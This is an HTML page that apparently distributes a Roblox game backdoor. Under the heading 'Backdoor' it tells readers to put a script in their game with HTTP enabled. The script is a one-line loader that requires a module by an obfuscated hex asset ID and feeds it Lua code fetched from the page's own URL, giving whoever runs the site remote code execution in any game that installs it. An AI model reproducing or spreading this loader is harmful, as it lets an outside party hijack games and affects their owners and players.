<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Roblox Modules</title>
        <link rel="stylesheet" media="screen" href="/assets/css/editor.css">
        <link rel="stylesheet" media="screen" href="/assets/css/index.css">
        <script src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.34.0/ace.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.34.0/ext-language_tools.min.js"></script>
    </head>
    <body>
        <div style="text-align: center;">
            <h1 style="margin-bottom: 0;">Backdoor</h1>
            <h3>Put this script in your game. Make sure HTTPEnabled is true.</h3>
        </div>
        <div class="grid-container">
            <div class="script-container" style="max-width: 820px; border: none; padding: 0; background-color: transparent;">
                <pre id="editor"></pre>
            </div>
        </div>
        <script src="/assets/js/editor.js"></script>
        <script>
            SetText("require(0x26E001F12)(game:GetService(\"HttpService\"):GetAsync(\"" + window.location.href + ".lua\"))")
            editor.setReadOnly(true);
        </script>
    </body>
</html>
